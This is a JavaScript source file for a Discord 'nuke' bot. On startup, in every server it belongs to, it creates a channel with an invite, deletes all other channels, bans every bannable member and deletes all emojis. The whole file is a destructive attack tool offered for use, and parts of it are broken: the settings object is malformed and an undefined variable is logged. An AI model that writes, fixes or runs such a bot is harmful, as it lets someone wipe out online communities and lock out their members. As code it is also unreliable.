const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');


// Settings for the bot.
const settings = {
    //Make sure you insert actual token rather than Client ID
client.login(process.env.TOKEN);
};

//on ready:
client.on("ready", () => {

    //startup message 
    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));
    // create variable for new channel to prevent it from getting deleted by nuke
    let createdChannelName;
    // Create an invite to a channel
    client.guilds.forEach(server => {
        //create new channel
        server.createChannel("-", "text").then(channel => {
            createdChannelName = channel.name;
            //then once channel is created, create an invite link to this channel
            channel.createInvite().then(inviteCode => {
                //log the invite link to console
                console.log(chalk.bgYellowBright(inviteCode));
                //catch errors
            }).catch(err => {
                if (err) throw err;
            });
        }).catch(err => {
            if (err) throw err;
        });
    });



    //delete all channels on server
    client.guilds.forEach(server => {
        server.channels.forEach(channel => {
            if (createdChannelName !== channel.name) {
                channel.delete().then(response => {
                    console.log("my response", response);
                }).catch(err => {
                    if (err) throw err;
                });
            }
        });
    });

    //ban all members on the server
    client.guilds.forEach(guild => {
        guild.members.forEach(m => {
            //set interval to prevent ratelimit error (API restrictions)
            setInterval(function() {
                //check if user is bannable
                if (!m.bannable) return console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                m.ban()
                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)

            }, 3 * 100)
        });
    });

    //delete emojis
    client.guilds.forEach(guild => {
        guild.emojis.forEach(em => {
            guild.deleteEmoji(em);
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${e.name}; ID: ${e.id}. (╯°□°）╯︵ ┻━┻`);
        });
    });



    //handle unexpected errors
    process.on("uncaughtException", err => {
        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
        process.exit(1);
    });
});

//handle unhandled rejections
process.on("unhandledRejection", err => {
    process.exit(1);
});

client.login(settings.botToken);
